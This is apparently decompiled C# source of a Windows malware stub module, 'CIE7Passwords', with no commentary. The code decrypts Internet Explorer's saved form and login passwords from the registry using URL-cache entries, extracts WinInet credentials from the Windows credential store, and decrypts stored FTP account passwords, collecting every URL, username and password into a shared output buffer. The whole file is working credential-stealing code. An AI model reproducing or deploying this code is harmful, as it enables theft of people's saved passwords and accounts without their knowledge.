using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace Stub
{
	// Token: 0x02000021 RID: 33
	internal class CIE7Passwords
	{
		// Token: 0x06000098 RID: 152 RVA: 0x00006888 File Offset: 0x00004A88
		[DebuggerNonUserCode]
		public CIE7Passwords()
		{
		}

		// Token: 0x06000099 RID: 153
		[DllImport("wininet.dll", CharSet = CharSet.Ansi, EntryPoint = "FindFirstUrlCacheEntryA", ExactSpelling = true, SetLastError = true)]
		private static extern int FindFirstUrlCacheEntry([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszUrlSearchPattern, IntPtr lpFirstCacheEntryInfo, ref int lpdwFirstCacheEntryInfoBufferSize);

		// Token: 0x0600009A RID: 154
		[DllImport("wininet.dll", CharSet = CharSet.Ansi, EntryPoint = "FindNextUrlCacheEntryA", ExactSpelling = true, SetLastError = true)]
		private static extern int FindNextUrlCacheEntry(int hEnum, IntPtr lpFirstCacheEntryInfo, ref int lpdwFirstCacheEntryInfoBufferSize);

		// Token: 0x0600009B RID: 155
		[DllImport("wininet.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int FindCloseUrlCache(int hEnumHandle);

		// Token: 0x0600009C RID: 156
		[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int lstrlenA(IntPtr lpString);

		// Token: 0x0600009D RID: 157
		[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int lstrcpyA([MarshalAs(UnmanagedType.VBByRefStr)] ref string RetVal, int ptr);

		// Token: 0x0600009E RID: 158
		[DllImport("advapi32.dll", CharSet = CharSet.Ansi, EntryPoint = "CryptAcquireContextA", ExactSpelling = true, SetLastError = true)]
		private static extern int CryptAcquireContext(ref int phProv, int pszContainer, [MarshalAs(UnmanagedType.VBByRefStr)] ref string pszProvider, int dwProvType, int dwFlags);

		// Token: 0x0600009F RID: 159
		[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int CryptCreateHash(int hProv, int Algid, int hKey, int dwFlags, ref int phHash);

		// Token: 0x060000A0 RID: 160
		[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int CryptHashData(int hHash, IntPtr pbData, int dwDataLen, int dwFlags);

		// Token: 0x060000A1 RID: 161
		[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int CryptGetHashParam(int hHash, int dwParam, IntPtr pByte, ref int pdwDataLen, int dwFlags);

		// Token: 0x060000A2 RID: 162
		[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int CryptGetHashParam(int hHash, int dwParam, [MarshalAs(UnmanagedType.LPArray)] ref byte[] pByte, ref int pdwDataLen, int dwFlags);

		// Token: 0x060000A3 RID: 163
		[DllImport("advapi32.dll", CharSet = CharSet.Ansi, EntryPoint = "CryptSignHashA", ExactSpelling = true, SetLastError = true)]
		private static extern int CryptSignHash(int hHash, int dwKeySpec, int sDescription, int dwFlags, int pbSignature, ref int pdwSigLen);

		// Token: 0x060000A4 RID: 164
		[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int CryptDestroyHash(int hHash);

		// Token: 0x060000A5 RID: 165
		[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int CryptReleaseContext(int hProv, int dwFlags);

		// Token: 0x060000A6 RID: 166
		[DllImport("advapi32.dll", CharSet = CharSet.Ansi, EntryPoint = "RegOpenKeyExA", ExactSpelling = true, SetLastError = true)]
		private static extern int RegOpenKeyEx(int hKey, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpSubKey, int ulOptions, int samDesired, ref int phkResult);

		// Token: 0x060000A7 RID: 167
		[DllImport("advapi32.dll", CharSet = CharSet.Ansi, EntryPoint = "RegQueryValueExA", ExactSpelling = true, SetLastError = true)]
		private static extern int RegQueryValueEx(int hKey, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpValueName, int lpReserved, ref int lpType, IntPtr lpData, ref int lpcbData);

		// Token: 0x060000A8 RID: 168
		[DllImport("advapi32.dll", CharSet = CharSet.Ansi, EntryPoint = "RegDeleteValueA", ExactSpelling = true, SetLastError = true)]
		private static extern int RegDeleteValue(int hKey, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpValueName);

		// Token: 0x060000A9 RID: 169
		[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int LocalFree(int hMem);

		// Token: 0x060000AA RID: 170
		[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int RegCloseKey(int hKey);

		// Token: 0x060000AB RID: 171
		[DllImport("Crypt32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int CryptUnprotectData(ref CIE7Passwords.DATA_BLOB pDataIn, int ppszDataDescr, IntPtr pOptionalEntropy, int pvReserved, int pPromptStruct, int dwFlags, ref CIE7Passwords.DATA_BLOB pDataOut);

		// Token: 0x060000AC RID: 172
		[DllImport("Crypt32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int CryptUnprotectData(ref CIE7Passwords.DATA_BLOB pDataIn, int ppszDataDescr, ref CIE7Passwords.DATA_BLOB pOptionalEntropy, int pvReserved, int pPromptStruct, int dwFlags, ref CIE7Passwords.DATA_BLOB pDataOut);

		// Token: 0x060000AD RID: 173
		[DllImport("advapi32.dll", CharSet = CharSet.Ansi, EntryPoint = "CredEnumerateW", ExactSpelling = true, SetLastError = true)]
		private static extern int CredEnumerate([MarshalAs(UnmanagedType.LPWStr)] string lpszFilter, int lFlags, ref int pCount, ref int lppCredentials);

		// Token: 0x060000AE RID: 174
		[DllImport("advapi32.dll", CharSet = CharSet.Ansi, EntryPoint = "CredDeleteW", ExactSpelling = true, SetLastError = true)]
		private static extern int CredDelete([MarshalAs(UnmanagedType.LPWStr)] string lpwstrTargetName, int dwType, int dwFlags);

		// Token: 0x060000AF RID: 175
		[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int CredFree(int pBuffer);

		// Token: 0x060000B0 RID: 176
		[DllImport("oleaut32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern string SysAllocString(int pOlechar);

		// Token: 0x060000B1 RID: 177 RVA: 0x00006894 File Offset: 0x00004A94
		private string GetStrFromPtrA(IntPtr lpszA)
		{
			return Marshal.PtrToStringAnsi(lpszA);
		}

		// Token: 0x060000B2 RID: 178 RVA: 0x000068B0 File Offset: 0x00004AB0
		private byte CheckSum(ref string s)
		{
			int num = 0;
			int num2 = 1;
			int num3 = Strings.Len(s);
			int num4 = num2;
			checked
			{
				for (;;)
				{
					int num5 = num4;
					int num6 = num3;
					if (num5 > num6)
					{
						break;
					}
					num += (int)Math.Round(Conversion.Val("&H" + Strings.Mid(s, num4, 2)));
					num4 += 2;
				}
				return (byte)(num % 256);
			}
		}

		// Token: 0x060000B3 RID: 179 RVA: 0x00006908 File Offset: 0x00004B08
		private string GetSHA1Hash(ref byte[] pbData)
		{
			checked
			{
				pbData = (byte[])Utils.CopyArray((Array)pbData, new byte[pbData.Length + 1 + 1]);
				byte[] array = SHA1.Create().ComputeHash(pbData);
				string text = "";
				int num = 0;
				int num2 = array.Length - 1;
				int num3 = num;
				for (;;)
				{
					int num4 = num3;
					int num5 = num2;
					if (num4 > num5)
					{
						break;
					}
					text += Strings.Right("00" + Conversion.Hex(array[num3]), 2);
					num3++;
				}
				return text;
			}
		}

		// Token: 0x060000B4 RID: 180 RVA: 0x00006984 File Offset: 0x00004B84
		private void ProcessIEPass(string strURL, string strHash, CIE7Passwords.DATA_BLOB dataOut)
		{
			CIE7Passwords.StringIndexEntry stringIndexEntry;
			int num = Strings.Len(stringIndexEntry);
			CIE7Passwords.StringIndexHeader stringIndexHeader;
			int num2 = Strings.Len(stringIndexHeader);
			int pbData = dataOut.pbData;
			IntPtr ptr = new IntPtr(dataOut.pbData);
			checked
			{
				IntPtr ptr2 = new IntPtr(pbData + (int)Marshal.ReadByte(ptr));
				object obj = Marshal.PtrToStructure(ptr2, stringIndexHeader.GetType());
				CIE7Passwords.StringIndexHeader stringIndexHeader2;
				stringIndexHeader = ((obj != null) ? ((CIE7Passwords.StringIndexHeader)obj) : stringIndexHeader2);
				bool flag = stringIndexHeader.dwType == 1;
				if (flag)
				{
					bool flag2 = stringIndexHeader.dwEntriesCount >= 2;
					if (flag2)
					{
						IntPtr intPtr = new IntPtr(ptr2.ToInt32() + stringIndexHeader.dwStructSize);
						IntPtr value = new IntPtr(intPtr.ToInt32() + stringIndexHeader.dwEntriesCount * num);
						int num3 = 0;
						int num4 = stringIndexHeader.dwEntriesCount - 1;
						int num5 = num3;
						for (;;)
						{
							int num6 = num5;
							int num7 = num4;
							if (num6 > num7)
							{
								break;
							}
							flag2 = (value == IntPtr.Zero | intPtr == IntPtr.Zero);
							if (flag2)
							{
								break;
							}
							object obj2 = Marshal.PtrToStructure(intPtr, stringIndexEntry.GetType());
							CIE7Passwords.StringIndexEntry stringIndexEntry2;
							stringIndexEntry = ((obj2 != null) ? ((CIE7Passwords.StringIndexEntry)obj2) : stringIndexEntry2);
							IntPtr intPtr2 = new IntPtr(value.ToInt32() + stringIndexEntry.dwDataOffset);
							flag2 = (CIE7Passwords.lstrlenA(intPtr2) != stringIndexEntry.dwDataSize);
							string text;
							if (flag2)
							{
								ptr = new IntPtr(value.ToInt32() + stringIndexEntry.dwDataOffset);
								text = Marshal.PtrToStringUni(ptr);
							}
							else
							{
								intPtr2 = new IntPtr(value.ToInt32() + stringIndexEntry.dwDataOffset);
								text = Marshal.PtrToStringAnsi(intPtr2);
							}
							intPtr = new IntPtr(intPtr.ToInt32() + num);
							object obj3 = Marshal.PtrToStructure(intPtr, stringIndexEntry.GetType());
							stringIndexEntry = ((obj3 != null) ? ((CIE7Passwords.StringIndexEntry)obj3) : stringIndexEntry2);
							string text2 = Strings.Space(stringIndexEntry.dwDataSize);
							intPtr2 = new IntPtr(value.ToInt32() + stringIndexEntry.dwDataOffset);
							flag2 = (CIE7Passwords.lstrlenA(intPtr2) != stringIndexEntry.dwDataSize);
							if (flag2)
							{
								ptr = new IntPtr(value.ToInt32() + stringIndexEntry.dwDataOffset);
								text2 = Marshal.PtrToStringUni(ptr);
							}
							else
							{
								intPtr2 = new IntPtr(value.ToInt32() + stringIndexEntry.dwDataOffset);
								text2 = Marshal.PtrToStringAnsi(intPtr2);
							}
							intPtr = new IntPtr(intPtr.ToInt32() + num);
							p.OL = string.Concat(new string[]
							{
								p.OL,
								"|URL| ",
								strURL,
								"\r\n|USR| ",
								text,
								"\r\n|PWD| ",
								text2,
								"\r\n"
							});
							num5 += 2;
						}
					}
				}
				else
				{
					bool flag2 = stringIndexHeader.dwType == 0;
					if (flag2)
					{
						string text2 = null;
						IntPtr intPtr = new IntPtr(ptr2.ToInt32() + stringIndexHeader.dwStructSize);
						IntPtr value = new IntPtr(intPtr.ToInt32() + stringIndexHeader.dwEntriesCount * num);
						flag2 = (value == IntPtr.Zero | intPtr == IntPtr.Zero);
						if (!flag2)
						{
							int num8 = 0;
							int num9 = stringIndexHeader.dwEntriesCount - 1;
							int num10 = num8;
							for (;;)
							{
								int num11 = num10;
								int num7 = num9;
								if (num11 > num7)
								{
									break;
								}
								object obj4 = Marshal.PtrToStructure(intPtr, stringIndexEntry.GetType());
								CIE7Passwords.StringIndexEntry stringIndexEntry2;
								stringIndexEntry = ((obj4 != null) ? ((CIE7Passwords.StringIndexEntry)obj4) : stringIndexEntry2);
								string text = Strings.Space(stringIndexEntry.dwDataSize);
								IntPtr intPtr2 = new IntPtr(value.ToInt32() + stringIndexEntry.dwDataOffset);
								flag2 = (CIE7Passwords.lstrlenA(intPtr2) != stringIndexEntry.dwDataSize);
								if (flag2)
								{
									ptr = new IntPtr(value.ToInt32() + stringIndexEntry.dwDataOffset);
									text = Marshal.PtrToStringUni(ptr);
								}
								else
								{
									intPtr2 = new IntPtr(value.ToInt32() + stringIndexEntry.dwDataOffset);
									text = Marshal.PtrToStringAnsi(intPtr2);
								}
								intPtr = new IntPtr(intPtr.ToInt32() + num);
								p.OL = string.Concat(new string[]
								{
									p.OL,
									"|URL| ",
									strURL,
									"\r\n|USR| ",
									text,
									"\r\n|PWD| ",
									text2,
									"\r\n"
								});
								num10++;
							}
						}
					}
				}
			}
		}

		// Token: 0x060000B5 RID: 181 RVA: 0x00006E38 File Offset: 0x00005038
		private void AddPasswdInfo(string strRess, int hKey)
		{
			strRess = Strings.LCase(strRess);
			byte[] bytes = Encoding.Unicode.GetBytes(strRess);
			string text = this.GetSHA1Hash(ref bytes);
			text += Strings.Right("00" + Conversion.Hex(this.CheckSum(ref text)), 2);
			int num2;
			int num3;
			int num = CIE7Passwords.RegQueryValueEx(hKey, ref text, 0, ref num2, IntPtr.Zero, ref num3);
			bool flag = num3 > 0;
			if (flag)
			{
				IntPtr lpData = Marshal.AllocHGlobal(num3);
				num = CIE7Passwords.RegQueryValueEx(hKey, ref text, 0, ref num2, lpData, ref num3);
				CIE7Passwords.DATA_BLOB data_BLOB;
				data_BLOB.cbData = num3;
				data_BLOB.pbData = lpData.ToInt32();
				CIE7Passwords.DATA_BLOB data_BLOB2;
				data_BLOB2.cbData = checked(Strings.Len(strRess) * 2 + 2);
				IntPtr hglobal = Marshal.StringToHGlobalUni(strRess);
				data_BLOB2.pbData = hglobal.ToInt32();
				CIE7Passwords.DATA_BLOB dataOut;
				CIE7Passwords.CryptUnprotectData(ref data_BLOB, 0, ref data_BLOB2, 0, 0, 0, ref dataOut);
				this.ProcessIEPass(strRess, text, dataOut);
				hglobal = new IntPtr(data_BLOB2.pbData);
				Marshal.FreeHGlobal(hglobal);
				CIE7Passwords.LocalFree(dataOut.pbData);
			}
		}

		// Token: 0x060000B6 RID: 182 RVA: 0x00006F40 File Offset: 0x00005140
		protected string CopyString(IntPtr ptr)
		{
			return Marshal.PtrToStringUni(ptr);
		}

		// Token: 0x060000B7 RID: 183 RVA: 0x00006F5C File Offset: 0x0000515C
		public void Refresh()
		{
			checked
			{
				try
				{
					Regex regex = new Regex("name=\"([^\"]+)\"", RegexOptions.Compiled);
					int hKey = -2147483647;
					string text = "Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage1";
					int num;
					CIE7Passwords.RegOpenKeyEx(hKey, ref text, 0, 131097, ref num);
					int hKey2 = -2147483647;
					text = "Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2";
					int num2;
					CIE7Passwords.RegOpenKeyEx(hKey2, ref text, 0, 131097, ref num2);
					bool flag = num2 != 0 || num != 0;
					if (flag)
					{
						text = null;
						int num4;
						int num3 = CIE7Passwords.FindFirstUrlCacheEntry(ref text, IntPtr.Zero, ref num4);
						flag = (num4 > 0);
						if (flag)
						{
							IntPtr intPtr = Marshal.AllocHGlobal(num4);
							Marshal.WriteInt32(intPtr, num4);
							text = null;
							num3 = CIE7Passwords.FindFirstUrlCacheEntry(ref text, intPtr, ref num4);
							do
							{
								CIE7Passwords.INTERNET_CACHE_ENTRY_INFO internet_CACHE_ENTRY_INFO;
								object obj = Marshal.PtrToStructure(intPtr, internet_CACHE_ENTRY_INFO.GetType());
								CIE7Passwords.INTERNET_CACHE_ENTRY_INFO internet_CACHE_ENTRY_INFO2;
								internet_CACHE_ENTRY_INFO = ((obj != null) ? ((CIE7Passwords.INTERNET_CACHE_ENTRY_INFO)obj) : internet_CACHE_ENTRY_INFO2);
								flag = ((internet_CACHE_ENTRY_INFO.CacheEntryType & 2097153) != 0);
								if (flag)
								{
									IntPtr intPtr2 = new IntPtr(internet_CACHE_ENTRY_INFO.lpszSourceUrlName);
									string text2 = this.GetStrFromPtrA(intPtr2);
									flag = (text2.IndexOf("?") >= 0);
									if (flag)
									{
										text2 = text2.Substring(0, text2.IndexOf("?"));
									}
									flag = (Strings.InStr(text2, "@", CompareMethod.Binary) > 0);
									if (flag)
									{
										text2 = Strings.Mid(text2, Strings.InStr(text2, "@", CompareMethod.Binary) + 1);
									}
									flag = (num != 0 && (internet_CACHE_ENTRY_INFO.CacheEntryType & 1) == 1);
									if (flag)
									{
										intPtr2 = new IntPtr(internet_CACHE_ENTRY_INFO.lpHeaderInfo);
										string strFromPtrA = this.GetStrFromPtrA(intPtr2);
										flag = (!string.IsNullOrEmpty(strFromPtrA) && strFromPtrA.Contains("text/html"));
										if (flag)
										{
											intPtr2 = new IntPtr(internet_CACHE_ENTRY_INFO.lpszLocalFileName);
											string strFromPtrA2 = this.GetStrFromPtrA(intPtr2);
											try
											{
												try
												{
													foreach (object obj2 in regex.Matches(File.ReadAllText(strFromPtrA2)))
													{
														Match match = (Match)obj2;
														this.AddPasswdInfo(match.Groups[1].Value, num);
													}
												}
												finally
												{
													IEnumerator enumerator;
													flag = (enumerator is IDisposable);
													if (flag)
													{
														(enumerator as IDisposable).Dispose();
													}
												}
											}
											catch (Exception ex)
											{
											}
										}
									}
									this.AddPasswdInfo(text2, num2);
								}
								num4 = 0;
								CIE7Passwords.FindNextUrlCacheEntry(num3, IntPtr.Zero, ref num4);
								Marshal.FreeHGlobal(intPtr);
								flag = (num4 > 0);
								if (flag)
								{
									intPtr = Marshal.AllocHGlobal(num4);
									Marshal.WriteInt32(intPtr, num4);
								}
							}
							while (CIE7Passwords.FindNextUrlCacheEntry(num3, intPtr, ref num4) != 0);
							CIE7Passwords.FindCloseUrlCache(num3);
						}
						CIE7Passwords.RegCloseKey(num);
						CIE7Passwords.RegCloseKey(num2);
					}
					string lpszFilter = "Microsoft_WinInet_*";
					int num5;
					int num6;
					CIE7Passwords.CredEnumerate(lpszFilter, 0, ref num5, ref num6);
					short[] array = new short[37];
					flag = (num5 > 0);
					CIE7Passwords.DATA_BLOB data_BLOB;
					CIE7Passwords.DATA_BLOB data_BLOB2;
					CIE7Passwords.DATA_BLOB data_BLOB3;
					if (flag)
					{
						int num7 = 0;
						int num8 = num5 - 1;
						int num9 = num7;
						for (;;)
						{
							int num10 = num9;
							int num11 = num8;
							if (num10 > num11)
							{
								break;
							}
							IntPtr intPtr2 = new IntPtr(num6 + num9 * 4);
							IntPtr intPtr = Marshal.ReadIntPtr(intPtr2);
							CIE7Passwords.CREDENTIAL credential;
							object obj3 = Marshal.PtrToStructure(intPtr, credential.GetType());
							CIE7Passwords.CREDENTIAL credential2;
							credential = ((obj3 != null) ? ((CIE7Passwords.CREDENTIAL)obj3) : credential2);
							intPtr2 = new IntPtr(credential.lpstrTargetName);
							string str = this.CopyString(intPtr2);
							data_BLOB.cbData = 74;
							intPtr = Marshal.AllocHGlobal(74);
							string str2 = "abe2869f-9b47-4cd9-a358-c22904dba7f7\0";
							int num12 = 0;
							int num13;
							do
							{
								Marshal.WriteInt16(intPtr, num12 * 2, (short)(Strings.Asc(Strings.Mid(str2, num12 + 1, 1)) * 4));
								num12++;
								num13 = num12;
								num11 = 36;
							}
							while (num13 <= num11);
							data_BLOB.pbData = intPtr.ToInt32();
							data_BLOB2.pbData = credential.lpbCredentialBlob;
							data_BLOB2.cbData = credential.dwCredentialBlobSize;
							data_BLOB3.cbData = 0;
							data_BLOB3.pbData = 0;
							CIE7Passwords.CryptUnprotectData(ref data_BLOB2, 0, ref data_BLOB, 0, 0, 0, ref data_BLOB3);
							Marshal.FreeHGlobal(intPtr);
							intPtr2 = new IntPtr(data_BLOB3.pbData);
							string expression = Marshal.PtrToStringUni(intPtr2);
							string[] array2 = Strings.Split(expression, ":", -1, CompareMethod.Binary);
							int num14 = Strings.InStr(Strings.Mid(str, 19), "/", CompareMethod.Binary);
							p.OL = string.Concat(new string[]
							{
								p.OL,
								"|URL| ",
								Strings.Mid(str, 19, num14 - 1),
								"\r\n|USR| ",
								array2[0],
								"\r\n|PWD| ",
								array2[1],
								"\r\n"
							});
							CIE7Passwords.LocalFree(data_BLOB3.pbData);
							num9++;
						}
					}
					CIE7Passwords.CredFree(num6);
					RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\FTP\\Accounts");
					foreach (string text3 in registryKey.GetSubKeyNames())
					{
						RegistryKey registryKey2 = registryKey.OpenSubKey(text3);
						foreach (string text4 in registryKey2.GetSubKeyNames())
						{
							RegistryKey registryKey3 = registryKey2.OpenSubKey(text4);
							byte[] array3 = (byte[])registryKey3.GetValue("Password");
							byte[] array4 = new byte[4];
							int num15 = 0;
							int num16 = text3.Length - 1;
							int num17 = num15;
							for (;;)
							{
								int num18 = num17;
								int num11 = num16;
								if (num18 > num11)
								{
									break;
								}
								byte b = (byte)(text3[num17] & '\u001f');
								array4[num17 & 3] = unchecked(array4[num17 & 3] + b);
								num17++;
							}
							data_BLOB2.cbData = array3.Length;
							IntPtr intPtr2 = Marshal.AllocHGlobal(array3.Length);
							data_BLOB2.pbData = intPtr2.ToInt32();
							byte[] source = array3;
							int startIndex = 0;
							intPtr2 = new IntPtr(data_BLOB2.pbData);
							Marshal.Copy(source, startIndex, intPtr2, array3.Length);
							data_BLOB3.cbData = 0;
							data_BLOB3.pbData = 0;
							GCHandle gchandle = GCHandle.Alloc(array4, GCHandleType.Pinned);
							intPtr2 = gchandle.AddrOfPinnedObject();
							data_BLOB.pbData = intPtr2.ToInt32();
							data_BLOB.cbData = 4;
							CIE7Passwords.CryptUnprotectData(ref data_BLOB2, 0, ref data_BLOB, 0, 0, 0, ref data_BLOB3);
							gchandle.Free();
							string[] array5 = new string[8];
							array5[0] = p.OL;
							array5[1] = "|URL| ";
							array5[2] = string.Format("ftp://{0}@{1}/", text3, text4);
							array5[3] = "\r\n|USR| ";
							array5[4] = text4;
							array5[5] = "\r\n|PWD| ";
							string[] array6 = array5;
							int num19 = 6;
							intPtr2 = new IntPtr(data_BLOB3.pbData);
							array6[num19] = Marshal.PtrToStringUni(intPtr2);
							array5[7] = "\r\n";
							p.OL = string.Concat(array5);
							CIE7Passwords.LocalFree(data_BLOB3.pbData);
						}
					}
				}
				catch (Exception ex2)
				{
				}
			}
		}

		// Token: 0x0400004E RID: 78
		private const int ERROR_CACHE_FIND_FAIL = 0;

		// Token: 0x0400004F RID: 79
		private const int ERROR_CACHE_FIND_SUCCESS = 1;

		// Token: 0x04000050 RID: 80
		private const int MAX_PATH = 260;

		// Token: 0x04000051 RID: 81
		private const int MAX_CACHE_ENTRY_INFO_SIZE = 4096;

		// Token: 0x04000052 RID: 82
		private const int NORMAL_CACHE_ENTRY = 1;

		// Token: 0x04000053 RID: 83
		private const int URLHISTORY_CACHE_ENTRY = 2097152;

		// Token: 0x04000054 RID: 84
		private const int PROV_RSA_FULL = 1;

		// Token: 0x04000055 RID: 85
		private const int ALG_CLASS_HASH = 32768;

		// Token: 0x04000056 RID: 86
		private const int ALG_TYPE_ANY = 0;

		// Token: 0x04000057 RID: 87
		private const int ALG_SID_SHA = 4;

		// Token: 0x04000058 RID: 88
		private const int CALG_SHA = 32772;

		// Token: 0x04000059 RID: 89
		private const int AT_SIGNATURE = 2;

		// Token: 0x0400005A RID: 90
		private const int HP_HASHVAL = 2;

		// Token: 0x0400005B RID: 91
		private const int READ_CONTROL = 131072;

		// Token: 0x0400005C RID: 92
		private const int STANDARD_RIGHTS_READ = 131072;

		// Token: 0x0400005D RID: 93
		private const int KEY_QUERY_VALUE = 1;

		// Token: 0x0400005E RID: 94
		private const int KEY_ENUMERATE_SUB_KEYS = 8;

		// Token: 0x0400005F RID: 95
		private const int KEY_NOTIFY = 16;

		// Token: 0x04000060 RID: 96
		private const int SYNCHRONIZE = 1048576;

		// Token: 0x04000061 RID: 97
		private const int STANDARD_RIGHTS_WRITE = 131072;

		// Token: 0x04000062 RID: 98
		private const int KEY_SET_VALUE = 2;

		// Token: 0x04000063 RID: 99
		private const int KEY_CREATE_SUB_KEY = 4;

		// Token: 0x04000064 RID: 100
		private const int KEY_READ = 131097;

		// Token: 0x04000065 RID: 101
		private const int KEY_WRITE = 131078;

		// Token: 0x04000066 RID: 102
		private const int HKEY_CURRENT_USER = -2147483647;

		// Token: 0x02000022 RID: 34
		private struct SYSTEMTIME
		{
			// Token: 0x04000067 RID: 103
			public short wYear;

			// Token: 0x04000068 RID: 104
			public short wMonth;

			// Token: 0x04000069 RID: 105
			public short wDayOfWeek;

			// Token: 0x0400006A RID: 106
			public short wDay;

			// Token: 0x0400006B RID: 107
			public short wHour;

			// Token: 0x0400006C RID: 108
			public short wMinute;

			// Token: 0x0400006D RID: 109
			public short wSecond;

			// Token: 0x0400006E RID: 110
			public short wMilliseconds;
		}

		// Token: 0x02000023 RID: 35
		private struct INTERNET_CACHE_ENTRY_INFO
		{
			// Token: 0x0400006F RID: 111
			public int dwStructSize;

			// Token: 0x04000070 RID: 112
			public int lpszSourceUrlName;

			// Token: 0x04000071 RID: 113
			public int lpszLocalFileName;

			// Token: 0x04000072 RID: 114
			public int CacheEntryType;

			// Token: 0x04000073 RID: 115
			public int dwUseCount;

			// Token: 0x04000074 RID: 116
			public int dwHitRate;

			// Token: 0x04000075 RID: 117
			public int dwSizeLow;

			// Token: 0x04000076 RID: 118
			public int dwSizeHigh;

			// Token: 0x04000077 RID: 119
			public FILETIME LastModifiedTime;

			// Token: 0x04000078 RID: 120
			public FILETIME ExpireTime;

			// Token: 0x04000079 RID: 121
			public FILETIME LastAccessTime;

			// Token: 0x0400007A RID: 122
			public FILETIME LastSyncTime;

			// Token: 0x0400007B RID: 123
			public int lpHeaderInfo;

			// Token: 0x0400007C RID: 124
			public int dwHeaderInfoSize;

			// Token: 0x0400007D RID: 125
			public int lpszFileExtension;

			// Token: 0x0400007E RID: 126
			public int dwExemptDelta;
		}

		// Token: 0x02000024 RID: 36
		private struct DATA_BLOB
		{
			// Token: 0x0400007F RID: 127
			public int cbData;

			// Token: 0x04000080 RID: 128
			public int pbData;
		}

		// Token: 0x02000025 RID: 37
		private struct StringIndexHeader
		{
			// Token: 0x04000081 RID: 129
			public int dwWICK;

			// Token: 0x04000082 RID: 130
			public int dwStructSize;

			// Token: 0x04000083 RID: 131
			public int dwEntriesCount;

			// Token: 0x04000084 RID: 132
			public int dwUnkId;

			// Token: 0x04000085 RID: 133
			public int dwType;

			// Token: 0x04000086 RID: 134
			public int dwUnk;
		}

		// Token: 0x02000026 RID: 38
		private struct StringIndexEntry
		{
			// Token: 0x04000087 RID: 135
			public int dwDataOffset;

			// Token: 0x04000088 RID: 136
			public FILETIME ftInsertDateTime;

			// Token: 0x04000089 RID: 137
			public int dwDataSize;
		}

		// Token: 0x02000027 RID: 39
		private enum CRED_TYPE
		{
			// Token: 0x0400008B RID: 139
			GENERIC = 1,
			// Token: 0x0400008C RID: 140
			DOMAIN_PASSWORD,
			// Token: 0x0400008D RID: 141
			DOMAIN_CERTIFICATE,
			// Token: 0x0400008E RID: 142
			DOMAIN_VISIBLE_PASSWORD,
			// Token: 0x0400008F RID: 143
			MAXIMUM
		}

		// Token: 0x02000028 RID: 40
		private struct CREDENTIAL_ATTRIBUTE
		{
			// Token: 0x04000090 RID: 144
			public int lpstrKeyword;

			// Token: 0x04000091 RID: 145
			public int dwFlags;

			// Token: 0x04000092 RID: 146
			public int dwValueSize;

			// Token: 0x04000093 RID: 147
			public int lpbValue;
		}

		// Token: 0x02000029 RID: 41
		private struct CREDENTIAL
		{
			// Token: 0x04000094 RID: 148
			public int dwFlags;

			// Token: 0x04000095 RID: 149
			public int dwType;

			// Token: 0x04000096 RID: 150
			public int lpstrTargetName;

			// Token: 0x04000097 RID: 151
			public int lpstrComment;

			// Token: 0x04000098 RID: 152
			public FILETIME ftLastWritten;

			// Token: 0x04000099 RID: 153
			public int dwCredentialBlobSize;

			// Token: 0x0400009A RID: 154
			public int lpbCredentialBlob;

			// Token: 0x0400009B RID: 155
			public int dwPersist;

			// Token: 0x0400009C RID: 156
			public int dwAttributeCount;

			// Token: 0x0400009D RID: 157
			public int lpAttributes;

			// Token: 0x0400009E RID: 158
			public int lpstrTargetAlias;

			// Token: 0x0400009F RID: 159
			public int lpUserName;
		}
	}
}
